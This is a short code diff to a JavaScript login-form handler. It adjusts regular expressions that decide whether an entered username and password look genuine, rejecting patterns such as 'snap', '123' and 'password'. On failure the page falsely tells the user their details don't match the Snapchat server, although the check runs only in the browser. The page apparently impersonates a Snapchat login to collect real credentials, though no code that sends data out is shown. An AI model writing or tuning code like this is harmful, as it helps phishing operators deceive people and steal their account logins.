@@ -668,12 +668,11 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   msgBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
   setTimeout(() => {
-    const usernameValid = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/.test(username) &&
-      /[0-9_.]/.test(username) &&
-      !/(123|abc|asd|snap|test)/i.test(username);
+    const usernameValid = /^[a-z][a-z0-9._]{2,14}$/.test(username) &&
+  !/(123|abc|asd|snap|test)/i.test(username);
 
-    const passwordValid = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])(?!.*\s)/.test(password) &&
-      !/(password|1234|asdf|qwer|1111)/i.test(password);
+const passwordValid = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?!.*\s)/.test(password) &&
+  !/(password|1234|asdf|qwer|1111)/i.test(password);
 
     if (!usernameValid || !passwordValid) {
       msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
